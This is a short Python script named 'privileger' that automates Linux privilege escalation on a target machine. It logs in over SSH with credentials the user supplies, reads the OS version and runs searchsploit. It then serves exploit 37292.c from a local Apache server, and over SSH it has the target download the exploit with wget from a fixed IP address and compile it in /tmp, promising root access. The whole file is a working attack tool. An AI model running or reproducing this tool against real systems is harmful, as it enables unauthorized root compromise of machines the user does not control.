#! /bin/bash
from termcolor import colored as col
from ftplib import FTP
import os
import subprocess
import time
import paramiko
i=1
while i<=1:
	def ssh_log():
		global vm_ip , user , passwd
		print(os.popen("figlet privileger").read())
		vm_ip=input(col("Enter the vm_ip.. " , "red"))
		user=input(col("Enter the username for ssh : " , "red"))
		passwd=input(col("Enter the password for ssh : ", "red"))
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(hostname = vm_ip , username= user , password = passwd)
		cmd="lsb_release -a"
		stdin,stdout,stderr=ssh_client.exec_command(cmd)
		stdout = stdout.readlines()
		print(''.join(stdout))
		version=input(col("Enter the version of vm : " , "red"))
		print(col("searching for exploit ..." , "blue"))
		time.sleep(10)
		exploit_search=os.popen("searchsploit "+version)
		print(exploit_search.read())
		print(col("using exploit exploits/linux/local/37292.c", 'yellow'))
		print(col("copying it to apache server..." , 'blue'))
		copy=os.popen("cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html | service apache2 start")
		time.sleep(5)

	ssh_log()

	def flag():
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_client.connect(hostname=vm_ip , username = user , password=passwd)
		cmd="wget http://192.168.43.241/37292.c -P /tmp;cd tmp;gcc -o tor 37292.c"
		print(col("Creating executable file for you..."))
		time.sleep(20)
		stdin,stdout,stderr=ssh_client.exec_command(cmd)
		stdout=stdout.readlines()
		print(col("All set for you now just ssh to your vm and run tor file which exist inside tmp folder to get root access..." , 'green' , 'on_grey'))
		print(os.popen("figlet Thankyou").read())
	flag()
	i=i+1
